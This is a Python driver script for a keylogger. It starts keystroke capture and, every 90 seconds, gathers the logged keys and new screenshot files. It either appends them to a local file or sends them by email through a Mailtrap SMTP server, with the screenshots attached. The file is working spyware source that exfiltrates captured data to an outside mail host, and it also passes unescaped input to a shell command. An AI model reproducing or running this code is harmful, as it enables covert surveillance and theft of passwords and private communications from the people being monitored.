import os
import smtplib
import subprocess
import sys
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))

from src.keylogger import Keylogger


def get_env_var(var):
    command = subprocess.Popen(f"echo {var}", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return command.stdout.read().decode("utf-8").strip()


def save_text_locally(text, file_path):
    try:
        mode = "a" if os.path.exists(file_path) else "w"
        with open(file_path, mode, encoding="utf-8") as file:
            file.write("-" * 10 + "{0} {1}".format(time.strftime("%d/%m/%Y"), time.strftime("%I:%M:%S")) + "-" * 10 + "\n")
            file.write(text)
        return True
    except IOError as e:
        print(f"Error writing to file: {e}")
        return False


def send_gmail(text, sender, receiver, screenshot_paths=[]):
    email_content = f"""\
Subject: Test mail for logs and screenshots.
To: {receiver}
From: {sender}

These are the logs:
{text}
"""

    try:
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = "Test mail for logs and screenshots"

        # Attach the email body
        msg.attach(MIMEText(email_content, 'plain'))

        # Attach any new screenshots
        for screenshot in screenshot_paths:
            if os.path.exists(screenshot):
                with open(screenshot, 'rb') as attachment:
                    mime_base = MIMEBase('application', 'octet-stream')
                    mime_base.set_payload(attachment.read())
                    encoders.encode_base64(mime_base)
                    mime_base.add_header('Content-Disposition', f'attachment; filename={os.path.basename(screenshot)}')
                    msg.attach(mime_base)

        smtp_server = smtplib.SMTP("live.smtp.mailtrap.io", 587)
        smtp_server.ehlo()
        smtp_server.starttls() # Using mailtrap requires tls
        smtp_server.login("api", "your-api-password") # Add your api password here
        print("Connection Successful")

        smtp_server.sendmail(sender, receiver, msg.as_string())
        smtp_server.close()
        print("Email sent successfully.")
        return True
    except smtplib.SMTPException as e:
        print(f"SMTP error occurred: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
    return False


class Main:
    def __init__(self, timer, export_path="", sender="", receiver=""):
        self.sender = sender
        self.receiver = receiver
        self.keylogger = Keylogger()
        self.timer = timer
        self.export_path = get_env_var(export_path)
        self.sent_screenshots = set()  

    def start(self):
        self.keylogger.start()

        while True:
            time.sleep(self.timer)

            if not self.keylogger.keylogger_running:
                break

            key_log = self.keylogger.get_key_log().encode("utf-8", errors="replace").decode()

            new_screenshots = self.get_new_screenshots()

            if key_log or new_screenshots:
                if not self.sender:
                    if save_text_locally(key_log, self.export_path):
                        self.keylogger.clear_key_log()
                else:
                    if send_gmail(key_log, self.sender, self.receiver, screenshot_paths=new_screenshots):
                        self.keylogger.clear_key_log()

    def get_new_screenshots(self):
        """Return the list of new screenshots not yet sent."""
        screenshot_dir = os.getcwd()  
        screenshots = []
        for file in os.listdir(screenshot_dir):
            if file.startswith("screenshot_") and file.endswith(".png"):
                screenshot_path = os.path.join(screenshot_dir, file)
                if screenshot_path not in self.sent_screenshots:
                    screenshots.append(screenshot_path)
                    self.sent_screenshots.add(screenshot_path)  
        return screenshots


if __name__ == "__main__":
    Main(90, "leon-logs.txt", "mailtrap-mail", "your-mail").start()   #Edit your mail and domain used for mailtrap 

